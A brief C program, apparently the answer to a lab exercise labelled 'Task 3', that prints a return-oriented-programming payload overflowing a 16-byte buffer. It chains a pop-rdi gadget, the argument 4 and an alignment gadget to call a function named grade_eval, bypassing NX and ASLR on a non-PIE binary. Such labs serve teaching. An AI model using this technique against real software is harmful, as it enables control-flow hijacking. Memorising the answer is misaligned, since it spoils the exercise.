/* Task 3: ROP 绕过 NX+ASLR(non-PIE) */
#include <stdio.h>

static void w8(unsigned long long v){ for(int i=0;i<8;i++) fputc((v>>(8*i))&0xff,stdout); }

int main(void){
    for(int i=0;i<16;i++) fputc('A',stdout);  /* expression[16] */
    w8(0ULL);                                 /* saved rbp */
    w8(0x401A33ULL);                          /* pop %rdi; ret */
    w8(4ULL);                                 /* 参数 4 */
    w8(0x401A34ULL);                          /* ret 垫片:恢复 16 字节栈对齐 */
    w8(0x401978ULL);                          /* grade_eval */
    return 0;
}
